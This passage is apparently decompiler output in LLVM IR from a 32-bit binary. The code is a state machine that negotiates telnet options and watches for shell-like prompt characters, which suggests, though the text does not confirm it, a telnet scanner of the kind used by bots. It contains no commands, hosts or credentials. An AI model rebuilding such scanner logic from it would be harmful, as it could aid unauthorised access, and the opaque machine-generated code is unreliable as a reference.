  br i1 %v4_804f4c0, label %dec_label_pc_804f460, label %dec_label_pc_804f4c4

dec_label_pc_804f4c4:                             ; preds = %dec_label_pc_804f4ab
  %v1_804f4c4 = add i32 %v0_804f4b5, 1936
  %v2_804f4c4 = inttoptr i32 %v1_804f4c4 to i32*
  store i32 0, i32* %v2_804f4c4, align 4
  %v0_804f4cf = load i32, i32* @esp, align 4
  %v1_804f4cf = add i32 %v0_804f4cf, 1928
  %v2_804f4cf = inttoptr i32 %v1_804f4cf to i32*
  store i32 4, i32* %v2_804f4cf, align 4
  %v0_804f4da = load i32, i32* @esp, align 4
  %v1_804f4dd = add i32 %v0_804f4da, 1928
  store i32 %v1_804f4dd, i32* %eax.global-to-local, align 4
  %v2_804f4e4 = add i32 %v0_804f4da, -16
  %v3_804f4e4 = inttoptr i32 %v2_804f4e4 to i32*
  store i32 %v1_804f4dd, i32* %v3_804f4e4, align 4
  %v1_804f4e5 = add i32 %v0_804f4da, 1936
  store i32 %v1_804f4e5, i32* %edx.global-to-local, align 4
  %v2_804f4ec = add i32 %v0_804f4da, -20
  %v3_804f4ec = inttoptr i32 %v2_804f4ec to i32*
  store i32 %v1_804f4e5, i32* %v3_804f4ec, align 4
  %v1_804f4ed = add i32 %v0_804f4da, -24
  %v2_804f4ed = inttoptr i32 %v1_804f4ed to i32*
  store i32 4, i32* %v2_804f4ed, align 4
  %v1_804f4ef = add i32 %v0_804f4da, -28
  %v2_804f4ef = inttoptr i32 %v1_804f4ef to i32*
  store i32 1, i32* %v2_804f4ef, align 4
  %v0_804f4f1 = load i32, i32* @edi, align 4
  %v1_804f4f1 = add i32 %v0_804f4f1, 4
  %v2_804f4f1 = inttoptr i32 %v1_804f4f1 to i32*
  %v3_804f4f1 = load i32, i32* %v2_804f4f1, align 4
  store i32 %v3_804f4f1, i32* %edx.global-to-local, align 4
  %v2_804f4f4 = add i32 %v0_804f4da, -32
  %v3_804f4f4 = inttoptr i32 %v2_804f4f4 to i32*
  store i32 %v3_804f4f1, i32* %v3_804f4f4, align 4
  %v0_804f4f5 = call i32 @function_8051b42()
  store i32 %v0_804f4f5, i32* %eax.global-to-local, align 4
  %v0_804f4fa = load i32, i32* @esp, align 4
  %v2_804f4fd = add i32 %v0_804f4fa, 1968
  %v3_804f4fd = inttoptr i32 %v2_804f4fd to i32*
  %v4_804f4fd = load i32, i32* %v3_804f4fd, align 4
  %v5_804f4fd = or i32 %v4_804f4fd, %v0_804f4f5
  %v6_804f4fd = icmp eq i32 %v5_804f4fd, 0
  store i32 %v5_804f4fd, i32* %eax.global-to-local, align 4
  %v1_804f504 = icmp eq i1 %v6_804f4fd, false
  br i1 %v1_804f504, label %dec_label_pc_8050044, label %dec_label_pc_804f50a

dec_label_pc_804f50a:                             ; preds = %dec_label_pc_804f4c4
  %v0_804f50a = load i32, i32* @edi, align 4
  %v1_804f50a = add i32 %v0_804f50a, 12
  %v2_804f50a = inttoptr i32 %v1_804f50a to i32*
  store i32 2, i32* %v2_804f50a, align 4
  %v1_804f511 = call i32 @function_804d5c0(i32 ptrtoint (i32* @0 to i32))
  %v2_804f511 = sext i32 %v1_804f511 to i64
  %v0_804f516 = load i16, i16* @global_var_80556cc.22, align 4
  %v1_804f516 = zext i16 %v0_804f516 to i32
  %v0_804f523 = load i32, i32* @global_var_8055680.23, align 128
  store i32 %v0_804f523, i32* @ebx, align 4
  store i32 %v1_804f516, i32* %ecx.global-to-local, align 4
  %v8_804f52d = zext i16 %v0_804f516 to i64
  %v9_804f52d = udiv i64 %v2_804f511, %v8_804f52d
  %v10_804f52d = trunc i64 %v9_804f52d to i32
  store i32 %v10_804f52d, i32* %eax.global-to-local, align 4
  %v11_804f52d = urem i64 %v2_804f511, %v8_804f52d
  %v12_804f52d = trunc i64 %v11_804f52d to i32
  store i32 %v12_804f52d, i32* %edx.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_804f523, 1
  br i1 %tmp144, label %dec_label_pc_804ffe0, label %dec_label_pc_804f537

dec_label_pc_804f537:                             ; preds = %dec_label_pc_804f50a
  %v0_804f537 = load i32, i32* @global_var_80556c8.24, align 8
  store i32 %v0_804f537, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f54c = trunc i64 %v11_804f52d to i16
  br label %dec_label_pc_804f54c

dec_label_pc_804f540:                             ; preds = %dec_label_pc_804f552, %dec_label_pc_804f54c
  %v1_804f540 = add i32 %v0_804f540, 1
  store i32 %v1_804f540, i32* %ecx.global-to-local, align 4
  %v1_804f541 = add i32 %v0_804f541, 16
  store i32 %v1_804f541, i32* %eax.global-to-local, align 4
  %v12_804f544 = icmp eq i32 %v0_804f523, %v1_804f540
  br i1 %v12_804f544, label %dec_label_pc_804ffe0, label %dec_label_pc_804f54c

dec_label_pc_804f54c:                             ; preds = %dec_label_pc_804f540, %dec_label_pc_804f537
  %v0_804f540 = phi i32 [ %v1_804f540, %dec_label_pc_804f540 ], [ 0, %dec_label_pc_804f537 ]
  %v0_804f541 = phi i32 [ %v1_804f541, %dec_label_pc_804f540 ], [ %v0_804f537, %dec_label_pc_804f537 ]
  %v3_804f54c = add i32 %v0_804f541, 8
  %v4_804f54c = inttoptr i32 %v3_804f54c to i16*
  %v5_804f54c = load i16, i16* %v4_804f54c, align 2
  %v11_804f54c = icmp ult i16 %v1_804f54c, %v5_804f54c
  br i1 %v11_804f54c, label %dec_label_pc_804f540, label %dec_label_pc_804f552

dec_label_pc_804f552:                             ; preds = %dec_label_pc_804f54c
  %v3_804f552 = add i32 %v0_804f541, 10
  %v4_804f552 = inttoptr i32 %v3_804f552 to i16*
  %v5_804f552 = load i16, i16* %v4_804f552, align 2
  %v11_804f552 = icmp ult i16 %v1_804f54c, %v5_804f552
  %v1_804f556 = icmp eq i1 %v11_804f552, false
  br i1 %v1_804f556, label %dec_label_pc_804f540, label %dec_label_pc_804ffe2

dec_label_pc_804f575:                             ; preds = %dec_label_pc_804f56a.preheader, %dec_label_pc_804f56a.backedge.dec_label_pc_804f575_crit_edge
  %v1_804f578 = phi i32 [ %v1_804f578.pre, %dec_label_pc_804f56a.backedge.dec_label_pc_804f575_crit_edge ], [ %v0_804f468, %dec_label_pc_804f56a.preheader ]
  %v0_804f575 = phi i32 [ %v0_804f56a, %dec_label_pc_804f56a.backedge.dec_label_pc_804f575_crit_edge ], [ %v0_804f56a29, %dec_label_pc_804f56a.preheader ]
  %v1_804f575 = add i32 %v0_804f575, 28
  store i32 %v1_804f575, i32* %eax.global-to-local, align 4
  %v2_804f578 = add i32 %v1_804f578, 20
  %v3_804f578 = inttoptr i32 %v2_804f578 to i32*
  store i32 %v1_804f575, i32* %v3_804f578, align 4
  %v0_804f57c = load i32, i32* @edi, align 4
  %v1_804f57c = add i32 %v0_804f57c, 24
  %v2_804f57c = inttoptr i32 %v1_804f57c to i32*
  %v3_804f57c = load i32, i32* %v2_804f57c, align 4
  %v9_804f57c = icmp eq i32 %v3_804f57c, 256
  br i1 %v9_804f57c, label %dec_label_pc_804fc41, label %dec_label_pc_804f589

dec_label_pc_804f589:                             ; preds = %dec_label_pc_804f575, %dec_label_pc_804fc41
  %v0_804f589 = load i32, i32* @esp, align 4
  %v1_804f589 = add i32 %v0_804f589, 104
  %v2_804f589 = inttoptr i32 %v1_804f589 to i32*
  %v3_804f589 = load i32, i32* %v2_804f589, align 4
  store i32 %v3_804f589, i32* %ecx.global-to-local, align 4
  %v1_804f58d = add i32 %v0_804f589, 20
  %v2_804f58d = inttoptr i32 %v1_804f58d to i32*
  %v3_804f58d = load i32, i32* %v2_804f58d, align 4
  store i32 %v3_804f58d, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804f596 = inttoptr i32 %v3_804f589 to i32*
  store i32 0, i32* %v1_804f596, align 4
  %v0_804f59c = load i32, i32* @edi, align 4
  %v1_804f59c = add i32 %v0_804f59c, 24
  %v2_804f59c = inttoptr i32 %v1_804f59c to i32*
  %v3_804f59c = load i32, i32* %v2_804f59c, align 4
  store i32 %v3_804f59c, i32* %edx.global-to-local, align 4
  %v0_804f59f = load i32, i32* @esp, align 4
  %v1_804f59f = add i32 %v0_804f59f, -4
  %v2_804f59f = inttoptr i32 %v1_804f59f to i32*
  store i32 16384, i32* %v2_804f59f, align 4
  %v0_804f5a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5a4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f5a4 = sub i32 %v0_804f5a4, %v1_804f5a4
  store i32 %v2_804f5a4, i32* %eax.global-to-local, align 4
  %v0_804f5a6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f5a6 = add i32 %v0_804f5a6, %v1_804f5a4
  store i32 %v2_804f5a6, i32* @ebx, align 4
  %v2_804f5a8 = add i32 %v0_804f59f, -8
  %v3_804f5a8 = inttoptr i32 %v2_804f5a8 to i32*
  store i32 %v2_804f5a4, i32* %v3_804f5a8, align 4
  %v0_804f5a9 = load i32, i32* @ebx, align 4
  %v2_804f5a9 = add i32 %v0_804f59f, -12
  %v3_804f5a9 = inttoptr i32 %v2_804f5a9 to i32*
  store i32 %v0_804f5a9, i32* %v3_804f5a9, align 4
  %v0_804f5aa = load i32, i32* @edi, align 4
  %v1_804f5aa = add i32 %v0_804f5aa, 4
  %v2_804f5aa = inttoptr i32 %v1_804f5aa to i32*
  %v3_804f5aa = load i32, i32* %v2_804f5aa, align 4
  store i32 %v3_804f5aa, i32* %eax.global-to-local, align 4
  %v2_804f5ad = add i32 %v0_804f59f, -16
  %v3_804f5ad = inttoptr i32 %v2_804f5ad to i32*
  store i32 %v3_804f5aa, i32* %v3_804f5ad, align 4
  %v0_804f5ae = call i32 @function_8051ba0()
  store i32 %v0_804f5ae, i32* %eax.global-to-local, align 4
  %v0_804f5b3 = load i32, i32* @esp, align 4
  %v1_804f5b3 = add i32 %v0_804f5b3, 16
  %tmp145 = icmp slt i32 %v0_804f5ae, 1
  br i1 %tmp145, label %dec_label_pc_804fbe7, label %dec_label_pc_804f5bf

dec_label_pc_804f5bf:                             ; preds = %dec_label_pc_804f589
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_804f5c1

dec_label_pc_804f5c1:                             ; preds = %dec_label_pc_804f5cb, %dec_label_pc_804f5bf
  %v0_804f5c7 = phi i32 [ %v1_804f5cb, %dec_label_pc_804f5cb ], [ 0, %dec_label_pc_804f5bf ]
  %v1_804f5c1 = load i32, i32* @ebx, align 4
  %v2_804f5c1 = add i32 %v1_804f5c1, %v0_804f5c7
  %v3_804f5c1 = inttoptr i32 %v2_804f5c1 to i8*
  %v4_804f5c1 = load i8, i8* %v3_804f5c1, align 1
  %v5_804f5c1 = icmp eq i8 %v4_804f5c1, 0
  %v1_804f5c5 = icmp eq i1 %v5_804f5c1, false
  br i1 %v1_804f5c5, label %dec_label_pc_804f5cb, label %dec_label_pc_804f5c7

dec_label_pc_804f5c7:                             ; preds = %dec_label_pc_804f5c1
  store i8 65, i8* %v3_804f5c1, align 1
  %v0_804f5cb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f5cb

dec_label_pc_804f5cb:                             ; preds = %dec_label_pc_804f5c1, %dec_label_pc_804f5c7
  %v0_804f5cb = phi i32 [ %v0_804f5c7, %dec_label_pc_804f5c1 ], [ %v0_804f5cb.pre, %dec_label_pc_804f5c7 ]
  %v1_804f5cb = add i32 %v0_804f5cb, 1
  store i32 %v1_804f5cb, i32* @edx, align 4
  %v12_804f5cc = icmp eq i32 %v0_804f5ae, %v1_804f5cb
  %v1_804f5ce = icmp eq i1 %v12_804f5cc, false
  br i1 %v1_804f5ce, label %dec_label_pc_804f5c1, label %dec_label_pc_804f5d0

dec_label_pc_804f5d0:                             ; preds = %dec_label_pc_804f5cb, %dec_label_pc_804fbed
  %v0_804f5d0 = load i32, i32* @edi, align 4
  %v1_804f5d0 = add i32 %v0_804f5d0, 24
  %v2_804f5d0 = inttoptr i32 %v1_804f5d0 to i32*
  %v3_804f5d0 = load i32, i32* %v2_804f5d0, align 4
  %v2_804f5d3 = add i32 %v3_804f5d0, %v0_804f5ae
  %v0_804f5d5 = load i32, i32* @global_var_80556d0.9, align 16
  store i32 %v0_804f5d5, i32* %eax.global-to-local, align 4
  store i32 %v2_804f5d3, i32* %v2_804f5d0, align 4
  %v0_804f5dd = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5dd = load i32, i32* @edi, align 4
  %v2_804f5dd = add i32 %v1_804f5dd, 8
  %v3_804f5dd = inttoptr i32 %v2_804f5dd to i32*
  store i32 %v0_804f5dd, i32* %v3_804f5dd, align 4
  br label %dec_label_pc_804f5e0

dec_label_pc_804f5e0:                             ; preds = %dec_label_pc_804faba, %dec_label_pc_804f5d0
  %v0_804f5e0 = load i32, i32* @edi, align 4
  %v1_804f5e0 = add i32 %v0_804f5e0, 12
  %v2_804f5e0 = inttoptr i32 %v1_804f5e0 to i32*
  %v3_804f5e0 = load i32, i32* %v2_804f5e0, align 4
  store i32 %v3_804f5e0, i32* %eax.global-to-local, align 4
  switch i32 %v3_804f5e0, label %dec_label_pc_804f56a.backedge [
    i32 2, label %dec_label_pc_804f5f0
    i32 3, label %dec_label_pc_804f699
    i32 4, label %dec_label_pc_804fada
    i32 5, label %dec_label_pc_804f7e0
    i32 6, label %dec_label_pc_804f825
    i32 7, label %dec_label_pc_804f8e0
    i32 8, label %dec_label_pc_804f9e0
    i32 9, label %dec_label_pc_804f99b
    i32 10, label %dec_label_pc_804fa25
  ]

dec_label_pc_804f5f0:                             ; preds = %dec_label_pc_804f5e0
  %v0_804f5f0 = load i32, i32* @esp, align 4
  %v1_804f5f0 = add i32 %v0_804f5f0, 20
  %v2_804f5f0 = inttoptr i32 %v1_804f5f0 to i32*
  %v3_804f5f0 = load i32, i32* %v2_804f5f0, align 4
  store i32 %v3_804f5f0, i32* @ebx, align 4
  %v1_804f5f4 = add i32 %v0_804f5f0, 36
  %v2_804f5f4 = inttoptr i32 %v1_804f5f4 to i32*
  store i32 0, i32* %v2_804f5f4, align 4
  %v0_804f5fc = load i32, i32* @edi, align 4
  %v1_804f5fc = add i32 %v0_804f5fc, 24
  %v2_804f5fc = inttoptr i32 %v1_804f5fc to i32*
  %v3_804f5fc = load i32, i32* %v2_804f5fc, align 4
  store i32 %v3_804f5fc, i32* %edx.global-to-local, align 4
  %v0_804f5ff587 = load i32, i32* @esp, align 4
  %v1_804f5ff588 = add i32 %v0_804f5ff587, 36
  %v2_804f5ff589 = inttoptr i32 %v1_804f5ff588 to i32*
  %v3_804f5ff590 = load i32, i32* %v2_804f5ff589, align 4
  %v5_804f5ff591 = sub i32 %v3_804f5ff590, %v3_804f5fc
  %v11_804f5ff592 = xor i32 %v3_804f5ff590, %v3_804f5fc
  %v12_804f5ff593 = xor i32 %v5_804f5ff591, %v3_804f5ff590
  %v13_804f5ff594 = and i32 %v12_804f5ff593, %v11_804f5ff592
  %v14_804f5ff595 = icmp slt i32 %v13_804f5ff594, 0
  %v16_804f5ff596 = icmp slt i32 %v5_804f5ff591, 0
  %v2_804f603597 = icmp eq i1 %v16_804f5ff596, %v14_804f5ff595
  br i1 %v2_804f603597, label %dec_label_pc_804f681, label %dec_label_pc_804f605.preheader

dec_label_pc_804f605.preheader:                   ; preds = %dec_label_pc_804f5f0, %dec_label_pc_804f5ff.backedge
  %v0_804f5ff599 = phi i32 [ %v0_804f5ff, %dec_label_pc_804f5ff.backedge ], [ %v0_804f5ff587, %dec_label_pc_804f5f0 ]
  %v4_804f5ff598 = phi i32 [ %v4_804f5ff.be, %dec_label_pc_804f5ff.backedge ], [ %v3_804f5fc, %dec_label_pc_804f5f0 ]
  br label %dec_label_pc_804f605

dec_label_pc_804f605:                             ; preds = %dec_label_pc_804f605.preheader, %dec_label_pc_804f656
  %v1_804f611 = phi i32 [ %v4_804f67b, %dec_label_pc_804f656 ], [ %v4_804f5ff598, %dec_label_pc_804f605.preheader ]
  %v1_804fb20 = phi i32 [ %v1_804f678, %dec_label_pc_804f656 ], [ %v0_804f5ff599, %dec_label_pc_804f605.preheader ]
  %v0_804f605 = load i32, i32* @ebx, align 4
  %v1_804f605 = inttoptr i32 %v0_804f605 to i8*
  %v2_804f605 = load i8, i8* %v1_804f605, align 1
  %v12_804f605 = icmp eq i8 %v2_804f605, -1
  %v1_804f608 = icmp eq i1 %v12_804f605, false
  br i1 %v1_804f608, label %dec_label_pc_804f681, label %dec_label_pc_804f60a

dec_label_pc_804f60a:                             ; preds = %dec_label_pc_804f605
  %v1_804f60a = add i32 %v1_804fb20, 20
  %v2_804f60a = inttoptr i32 %v1_804f60a to i32*
  %v3_804f60a = load i32, i32* %v2_804f60a, align 4
  %v1_804f60e = add i32 %v0_804f605, 1
  store i32 %v1_804f60e, i32* %esi.global-to-local, align 4
  %v2_804f611 = add i32 %v3_804f60a, %v1_804f611
  store i32 %v2_804f611, i32* %ecx.global-to-local, align 4
  %tmp768 = icmp ugt i32 %v2_804f611, %v1_804f60e
  br i1 %tmp768, label %dec_label_pc_804f617, label %dec_label_pc_804f681

dec_label_pc_804f617:                             ; preds = %dec_label_pc_804f60a
  %v2_804f617 = inttoptr i32 %v1_804f60e to i8*
  %v3_804f617 = load i8, i8* %v2_804f617, align 1
  %v4_804f617 = zext i8 %v3_804f617 to i32
  %v5_804f617 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f617 = and i32 %v5_804f617, -256
  %v7_804f617 = or i32 %v6_804f617, %v4_804f617
  store i32 %v7_804f617, i32* %eax.global-to-local, align 4
  switch i8 %v3_804f617, label %dec_label_pc_804f62a [
    i8 -1, label %dec_label_pc_804fb16
    i8 -3, label %dec_label_pc_804fb57
  ]

dec_label_pc_804f62a:                             ; preds = %dec_label_pc_804f617
  %v1_804f62a = add i32 %v0_804f605, 2
  store i32 %v1_804f62a, i32* %eax.global-to-local, align 4
  %tmp769 = icmp ugt i32 %v2_804f611, %v1_804f62a
  br i1 %tmp769, label %dec_label_pc_804f631, label %dec_label_pc_804f681

dec_label_pc_804f631:                             ; preds = %dec_label_pc_804f62a, %dec_label_pc_804fff3, %dec_label_pc_804fffb, %dec_label_pc_804fbdf
  %v0_804f631 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f631 = inttoptr i32 %v0_804f631 to i8*
  %v2_804f631 = load i8, i8* %v1_804f631, align 1
  %v3_804f631 = zext i8 %v2_804f631 to i32
  %v4_804f631 = load i32, i32* %eax.global-to-local, align 4
  %v5_804f631 = and i32 %v4_804f631, -256
  %v6_804f631 = or i32 %v5_804f631, %v3_804f631
  store i32 %v6_804f631, i32* %eax.global-to-local, align 4
  switch i8 %v2_804f631, label %dec_label_pc_804f643 [
    i8 -3, label %dec_label_pc_804fb40
    i8 -5, label %dec_label_pc_804fc64
  ]

dec_label_pc_804f643:                             ; preds = %dec_label_pc_804f631, %dec_label_pc_804fc64
  %v5_804f643 = phi i32 [ %v5_804f643.pre, %dec_label_pc_804fc64 ], [ %v6_804f631, %dec_label_pc_804f631 ]
  %v0_804f643 = load i32, i32* @ebx, align 4
  %v1_804f643 = add i32 %v0_804f643, 2
  %v2_804f643 = inttoptr i32 %v1_804f643 to i8*
  %v3_804f643 = load i8, i8* %v2_804f643, align 1
  %v4_804f643 = zext i8 %v3_804f643 to i32
  %v6_804f643 = and i32 %v5_804f643, -256
  %v7_804f643 = or i32 %v4_804f643, %v6_804f643
  store i32 %v7_804f643, i32* %eax.global-to-local, align 4
  %v11_804f646 = icmp eq i8 %v3_804f643, -3
  br i1 %v11_804f646, label %dec_label_pc_804fb4e, label %dec_label_pc_804f64e

dec_label_pc_804f64e:                             ; preds = %dec_label_pc_804fb40, %dec_label_pc_804f643
  %v0_804fc6c = phi i32 [ %v0_804fb43, %dec_label_pc_804fb40 ], [ %v0_804f643, %dec_label_pc_804f643 ]
  %v0_804f64e = phi i32 [ %v7_804fb43, %dec_label_pc_804fb40 ], [ %v7_804f643, %dec_label_pc_804f643 ]
  %v1_804f64e = trunc i32 %v0_804f64e to i8
  %v11_804f64e = icmp eq i8 %v1_804f64e, -5
  br i1 %v11_804f64e, label %dec_label_pc_804fc6c, label %dec_label_pc_804f656

dec_label_pc_804f656:                             ; preds = %dec_label_pc_804f64e, %dec_label_pc_804fc6c, %dec_label_pc_804fb4e
  %v0_804f656 = load i32, i32* @esp, align 4
  %v1_804f656 = add i32 %v0_804f656, -4
  %v2_804f656 = inttoptr i32 %v1_804f656 to i32*
  store i32 16384, i32* %v2_804f656, align 4
  %v1_804f65b = add i32 %v0_804f656, -8
  %v2_804f65b = inttoptr i32 %v1_804f65b to i32*
  store i32 3, i32* %v2_804f65b, align 4
  %v0_804f65d = load i32, i32* @ebx, align 4
  %v2_804f65d = add i32 %v0_804f656, -12
  %v3_804f65d = inttoptr i32 %v2_804f65d to i32*
  store i32 %v0_804f65d, i32* %v3_804f65d, align 4
  %v0_804f65e = load i32, i32* @ebx, align 4
  %v1_804f65e = add i32 %v0_804f65e, 3
  store i32 %v1_804f65e, i32* @ebx, align 4
  %v0_804f661 = load i32, i32* @edi, align 4
  %v1_804f661 = add i32 %v0_804f661, 4
  %v2_804f661 = inttoptr i32 %v1_804f661 to i32*
  %v3_804f661 = load i32, i32* %v2_804f661, align 4
  store i32 %v3_804f661, i32* %eax.global-to-local, align 4
  %v2_804f664 = add i32 %v0_804f656, -16
  %v3_804f664 = inttoptr i32 %v2_804f664 to i32*
  store i32 %v3_804f661, i32* %v3_804f664, align 4
  %v0_804f665 = call i32 @function_8051c16()
  store i32 %v0_804f665, i32* %eax.global-to-local, align 4
  %v0_804f66a = load i32, i32* @esp, align 4
  %v1_804f66a = add i32 %v0_804f66a, 52
  %v2_804f66a = inttoptr i32 %v1_804f66a to i32*
  %v3_804f66a = load i32, i32* %v2_804f66a, align 4
  %v0_804f66e = load i32, i32* @edi, align 4
  %v1_804f66e = add i32 %v0_804f66e, 24
  %v2_804f66e = inttoptr i32 %v1_804f66e to i32*
  %v3_804f66e = load i32, i32* %v2_804f66e, align 4
  store i32 %v3_804f66e, i32* %edx.global-to-local, align 4
  %v1_804f671 = add i32 %v3_804f66a, 3
  store i32 %v1_804f671, i32* %v2_804f66a, align 4
  %v0_804f678 = load i32, i32* @esp, align 4
  %v1_804f678 = add i32 %v0_804f678, 16
  %v1_804f67b = add i32 %v0_804f678, 52
  %v2_804f67b = inttoptr i32 %v1_804f67b to i32*
  %v3_804f67b = load i32, i32* %v2_804f67b, align 4
  %v4_804f67b = load i32, i32* %edx.global-to-local, align 4
  %v5_804f67b = sub i32 %v3_804f67b, %v4_804f67b
  %v11_804f67b = xor i32 %v4_804f67b, %v3_804f67b
  %v12_804f67b = xor i32 %v5_804f67b, %v3_804f67b
  %v13_804f67b = and i32 %v12_804f67b, %v11_804f67b
  %v14_804f67b = icmp slt i32 %v13_804f67b, 0
  %v16_804f67b = icmp slt i32 %v5_804f67b, 0
  %v2_804f67f = icmp eq i1 %v16_804f67b, %v14_804f67b
  br i1 %v2_804f67f, label %dec_label_pc_804f681, label %dec_label_pc_804f605

dec_label_pc_804f681:                             ; preds = %dec_label_pc_804f5f0, %dec_label_pc_804f5ff.backedge, %dec_label_pc_804fb57, %dec_label_pc_804f62a, %dec_label_pc_804f60a, %dec_label_pc_804f656, %dec_label_pc_804f605
  %v0_804f681 = phi i32 [ %v1_804f678, %dec_label_pc_804f656 ], [ %v0_804fbb7, %dec_label_pc_804fb57 ], [ %v1_804fb20, %dec_label_pc_804f62a ], [ %v1_804fb20, %dec_label_pc_804f60a ], [ %v1_804fb20, %dec_label_pc_804f605 ], [ %v0_804f5ff587, %dec_label_pc_804f5f0 ], [ %v0_804f5ff, %dec_label_pc_804f5ff.backedge ]
  %v1_804f681 = add i32 %v0_804f681, 36
  %v2_804f681 = inttoptr i32 %v1_804f681 to i32*
  %v3_804f681 = load i32, i32* %v2_804f681, align 4
  store i32 %v3_804f681, i32* @esi, align 4
  %tmp146 = icmp slt i32 %v3_804f681, 1
  br i1 %tmp146, label %dec_label_pc_804fb29, label %dec_label_pc_804f68d

dec_label_pc_804f68d:                             ; preds = %dec_label_pc_804f681
  %v0_804f68d = load i32, i32* @edi, align 4
  %v1_804f68d = add i32 %v0_804f68d, 12
  %v2_804f68d = inttoptr i32 %v1_804f68d to i32*
  store i32 3, i32* %v2_804f68d, align 4
  br label %dec_label_pc_804faab

dec_label_pc_804f699:                             ; preds = %dec_label_pc_804f5e0
  %v1_804f699 = add i32 %v0_804f5e0, 24
  %v2_804f699 = inttoptr i32 %v1_804f699 to i32*
  %v3_804f699 = load i32, i32* %v2_804f699, align 4
  %v1_804f69c = add i32 %v3_804f699, -1
  store i32 %v1_804f69c, i32* %eax.global-to-local, align 4
  %tmp147 = icmp slt i32 %v1_804f69c, 1
  br i1 %tmp147, label %dec_label_pc_804f6db, label %dec_label_pc_804f6a1

dec_label_pc_804f6a1:                             ; preds = %dec_label_pc_804f699
  %v2_804f6a1 = add i32 %v0_804f5e0, 27
  %v3_804f6a1 = add i32 %v2_804f6a1, %v3_804f699
  %v4_804f6a1 = inttoptr i32 %v3_804f6a1 to i8*
  %v5_804f6a1 = load i8, i8* %v4_804f6a1, align 1
  %v6_804f6a1 = zext i8 %v5_804f6a1 to i32
  %v7_804f6a1 = load i32, i32* @edx, align 4
  %v8_804f6a1 = and i32 %v7_804f6a1, -256
  %v9_804f6a1 = or i32 %v8_804f6a1, %v6_804f6a1
  store i32 %v9_804f6a1, i32* %edx.global-to-local, align 4
  switch i8 %v5_804f6a1, label %dec_label_pc_804f6af [
    i8 62, label %dec_label_pc_804f6cf
    i8 58, label %dec_label_pc_804f6cf
  ]

dec_label_pc_804f6af:                             ; preds = %dec_label_pc_804f6a1, %dec_label_pc_804f6c1
  %v0_804f6be = phi i32 [ %v1_804f6be, %dec_label_pc_804f6c1 ], [ %v1_804f69c, %dec_label_pc_804f6a1 ]
  %v7_804f6c1 = phi i32 [ %v9_804f6c1, %dec_label_pc_804f6c1 ], [ %v9_804f6a1, %dec_label_pc_804f6a1 ]
  %v1_804f6af = trunc i32 %v7_804f6c1 to i8
  %v1_804f6af.off = add i8 %v1_804f6af, -35
  %switch = icmp ult i8 %v1_804f6af.off, 3
  br i1 %switch, label %dec_label_pc_804f6cf, label %dec_label_pc_804f6be

dec_label_pc_804f6be:                             ; preds = %dec_label_pc_804f6af
  %v1_804f6be = add i32 %v0_804f6be, -1
  %v8_804f6be = icmp eq i32 %v1_804f6be, 0
  store i32 %v1_804f6be, i32* %eax.global-to-local, align 4
  br i1 %v8_804f6be, label %dec_label_pc_804f6db, label %dec_label_pc_804f6c1

dec_label_pc_804f6c1:                             ; preds = %dec_label_pc_804f6be
  %v3_804f6c1 = add i32 %v2_804f6a1, %v0_804f6be
  %v4_804f6c1 = inttoptr i32 %v3_804f6c1 to i8*
  %v5_804f6c1 = load i8, i8* %v4_804f6c1, align 1
  %v6_804f6c1 = zext i8 %v5_804f6c1 to i32
  %v8_804f6c1 = and i32 %v7_804f6c1, -256
  %v9_804f6c1 = or i32 %v6_804f6c1, %v8_804f6c1
  store i32 %v9_804f6c1, i32* %edx.global-to-local, align 4
  %v10_804f6c5 = icmp ne i8 %v5_804f6c1, 58
  %v10_804f6ca = icmp eq i8 %v5_804f6c1, 62
  %v1_804f6cd = icmp eq i1 %v10_804f6ca, false
  %or.cond249 = and i1 %v10_804f6c5, %v1_804f6cd
  br i1 %or.cond249, label %dec_label_pc_804f6af, label %dec_label_pc_804f6cf

dec_label_pc_804f6cf:                             ; preds = %dec_label_pc_804f6af, %dec_label_pc_804f6c1, %dec_label_pc_804f6a1, %dec_label_pc_804f6a1
  %v0_804f6cf = phi i32 [ %v1_804f69c, %dec_label_pc_804f6a1 ], [ %v1_804f69c, %dec_label_pc_804f6a1 ], [ %v0_804f6be, %dec_label_pc_804f6af ], [ %v1_804f6be, %dec_label_pc_804f6c1 ]
  %v1_804f6cf = add i32 %v0_804f6cf, 1
  store i32 %v1_804f6cf, i32* %eax.global-to-local, align 4
  %v1_804f6d0 = load i32, i32* @esp, align 4
  %v2_804f6d0 = add i32 %v1_804f6d0, 36
  %v3_804f6d0 = inttoptr i32 %v2_804f6d0 to i32*
  store i32 %v1_804f6cf, i32* %v3_804f6d0, align 4
  %v0_804f6d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f6d4 = add i32 %v0_804f6d4, 1
  %v8_804f6d4 = icmp eq i32 %v1_804f6d4, 0
  store i32 %v1_804f6d4, i32* %eax.global-to-local, align 4
  %v1_804f6d5 = icmp eq i1 %v8_804f6d4, false
  br i1 %v1_804f6d5, label %dec_label_pc_804ff65, label %dec_label_pc_804f6db

dec_label_pc_804f6db:                             ; preds = %dec_label_pc_804f6be, %dec_label_pc_804f6cf, %dec_label_pc_804f699
  %v0_804f6db = load i32, i32* @esp, align 4
  %v1_804f6de = add i32 %v0_804f6db, -16
  %v2_804f6de = inttoptr i32 %v1_804f6de to i32*
  store i32 26, i32* %v2_804f6de, align 4
  %v0_804f6e0 = call i32 @function_80509f0()
  store i32 %v0_804f6e0, i32* %eax.global-to-local, align 4
  %v0_804f6e5 = load i32, i32* @esp, align 4
  %v1_804f6e5 = inttoptr i32 %v0_804f6e5 to i32*
  store i32 27, i32* %v1_804f6e5, align 4
  %v0_804f6ec = call i32 @function_80509f0()
  store i32 %v0_804f6ec, i32* %eax.global-to-local, align 4
  %v0_804f6f1 = load i32, i32* @esp, align 4
  %v1_804f6f1 = inttoptr i32 %v0_804f6f1 to i32*
  %v2_804f6f1 = load i32, i32* %v1_804f6f1, align 4
  store i32 %v2_804f6f1, i32* %ecx.global-to-local, align 4
  %v3_804f6f1 = add i32 %v0_804f6f1, 4
